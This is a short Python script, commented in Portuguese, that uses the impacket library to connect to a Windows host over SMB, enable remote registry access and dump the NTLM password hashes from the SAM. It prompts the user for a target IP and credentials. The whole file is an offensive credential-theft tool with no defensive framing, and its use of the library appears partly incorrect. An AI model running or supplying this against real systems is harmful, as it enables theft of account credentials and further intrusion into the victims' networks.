from impacket.examples.secretsdump import RemoteOperations, SAMHashes
from impacket.smbconnection import SMBConnection

def dump_hashes(ip, username, password):
    """Extrai hashes NTLM armazenados em uma máquina Windows."""
    try:
        conn = SMBConnection(ip, ip)
        conn.login(username, password)
        print(f"[+] Conectado ao host: {ip}")

        # Manipulação remota do registro do Windows
        remote_ops = RemoteOperations(conn, False)
        remote_ops.enableRegistry()

        # Extração de hashes NTLM
        sam_hashes = SAMHashes(remote_ops, conn, False)
        sam_hashes.dump()

        remote_ops.finish()
        conn.close()

    except Exception as e:
        print(f"[-] Erro durante a extração dos hashes: {e}")

if __name__ == "__main__":
    ip = input("Digite o endereço IP do alvo: ")
    usuario = input("Digite o nome de usuário: ")
    senha = input("Digite a senha: ")

    dump_hashes(ip, usuario, senha)
